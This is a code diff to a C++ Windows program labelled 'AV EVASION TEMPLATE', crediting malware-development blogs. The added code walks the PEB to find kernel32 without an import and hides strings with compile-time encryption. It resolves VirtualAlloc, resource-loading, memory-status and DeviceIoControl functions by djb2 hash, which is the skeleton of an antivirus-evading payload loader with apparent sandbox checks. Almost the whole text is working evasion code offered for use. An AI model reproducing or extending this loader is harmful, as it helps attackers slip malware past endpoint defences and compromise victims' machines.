@@ -1,5 +1,14 @@
+/*
+AV EVASION TEMPLATE
+Thanks to:
+https://0xpat.github.io/Malware_development_part_2/
+https://0xpat.github.io/Malware_development_part_4/
+https://captmeelo.com/redteam/maldev/2021/12/15/lazy-maldev.html
+*/
+
 #include <iostream>
 #include <windows.h>
+#include <winternl.h>
 
 #include "skc.hpp"
 
@@ -29,8 +38,28 @@ unsigned int HashDjb2(std::string str) {
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow) {
 
+    // Get Kernel32
+	PPEB pPEB = (PPEB) __readgsqword(0x60);
+	PPEB_LDR_DATA pLoaderData = pPEB->Ldr;
+	PLIST_ENTRY listHead = &pLoaderData->InMemoryOrderModuleList;
+	PLIST_ENTRY listCurrent = listHead->Flink;
+	PVOID kernel32Address;
+	do {
+		PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(listCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+		DWORD dllNameLength = WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, NULL, 0, NULL, NULL);
+		PCHAR dllName = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllNameLength);
+		WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, dllName, dllNameLength, NULL, NULL);
+		CharUpperA(dllName);
+		if (strstr(dllName, SKCR("KERNEL32.DLL"))) {
+			kernel32Address = dllEntry->DllBase;
+			HeapFree(GetProcessHeap(), 0, dllName);
+			break;
+		}
+		HeapFree(GetProcessHeap(), 0, dllName);
+		listCurrent = listCurrent->Flink;
+	} while (listCurrent != listHead);
+
     // API hashing
-    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
     PFindResource fFindResource;
     PSizeofResource fSizeofResource;
     PLoadResource fLoadResource;
@@ -44,38 +73,38 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine,
     PDeviceIoControl fDeviceIoControl;
 
     // Resolve functions
-    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER) hKernel32;
-    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS) ((PBYTE) hKernel32 + pDosHeader->e_lfanew);
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER) kernel32Address;
+    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS) ((PBYTE) kernel32Address + pDosHeader->e_lfanew);
     PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) &(pNtHeader->OptionalHeader);
-    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY) ((PBYTE) hKernel32 + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-    PULONG pAddressOfFunctions = (PULONG) ((PBYTE) hKernel32 + pExportDirectory->AddressOfFunctions);
-    PULONG pAddressOfNames = (PULONG) ((PBYTE) hKernel32 + pExportDirectory->AddressOfNames);
-    PUSHORT pAddressOfNameOrdinals = (PUSHORT) ((PBYTE) hKernel32 + pExportDirectory->AddressOfNameOrdinals);
+    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY) ((PBYTE) kernel32Address + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    PULONG pAddressOfFunctions = (PULONG) ((PBYTE) kernel32Address + pExportDirectory->AddressOfFunctions);
+    PULONG pAddressOfNames = (PULONG) ((PBYTE) kernel32Address + pExportDirectory->AddressOfNames);
+    PUSHORT pAddressOfNameOrdinals = (PUSHORT) ((PBYTE) kernel32Address + pExportDirectory->AddressOfNameOrdinals);
 
     for (int i = 0; i < pExportDirectory->NumberOfNames; ++i) {
-        PCSTR pFunctionName = (PSTR) ((PBYTE) hKernel32 + pAddressOfNames[i]);
+        PCSTR pFunctionName = (PSTR) ((PBYTE) kernel32Address + pAddressOfNames[i]);
         if (HashDjb2(pFunctionName) == 0x7ff6a4a5) {
-            fVirtualAlloc = (PVirtualAlloc) ((PBYTE) hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+            fVirtualAlloc = (PVirtualAlloc) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
         } else if (HashDjb2(pFunctionName) == 0x7d8d84fd) {
-            fFindResource = (PFindResource) ((PBYTE) hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+            fFindResource = (PFindResource) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
         } else if (HashDjb2(pFunctionName) == 0x70dbb8eb) {
-            fSizeofResource = (PSizeofResource) ((PBYTE) hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+            fSizeofResource = (PSizeofResource) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
         } else if (HashDjb2(pFunctionName) == 0x24a8ee5b) {
-            fLoadResource = (PLoadResource) ((PBYTE) hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+            fLoadResource = (PLoadResource) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
         } else if (HashDjb2(pFunctionName) == 0x5c2527a4) {
-            fLockResource = (PLockResource) ((PBYTE) hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+            fLockResource = (PLockResource) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
         } else if (HashDjb2(pFunctionName) == 0x13b1935d) {
-            fFreeResource = (PFreeResource) ((PBYTE) hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+            fFreeResource = (PFreeResource) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
         } else if (HashDjb2(pFunctionName) == 0x49b4fa7c) {
-            fVirtualFree = (PVirtualFree) ((PBYTE) hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+            fVirtualFree = (PVirtualFree) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
         } else if (HashDjb2(pFunctionName) == 0xc42626c4) {
-            fGetSystemInfo = (PGetSystemInfo) ((PBYTE) hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+            fGetSystemInfo = (PGetSystemInfo) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
         } else if (HashDjb2(pFunctionName) == 0x230fd4fe) {
-            fGlobalMemoryStatusEx = (PGlobalMemoryStatusEx) ((PBYTE) hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+            fGlobalMemoryStatusEx = (PGlobalMemoryStatusEx) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
         } else if (HashDjb2(pFunctionName) == 0xcebbf15e) {
-            fCreateFileW = (PCreateFileW) ((PBYTE) hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+            fCreateFileW = (PCreateFileW) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
         } else if (HashDjb2(pFunctionName) == 0x2da631c) {
-            fDeviceIoControl = (PDeviceIoControl) ((PBYTE) hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+            fDeviceIoControl = (PDeviceIoControl) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
         }
     }
 
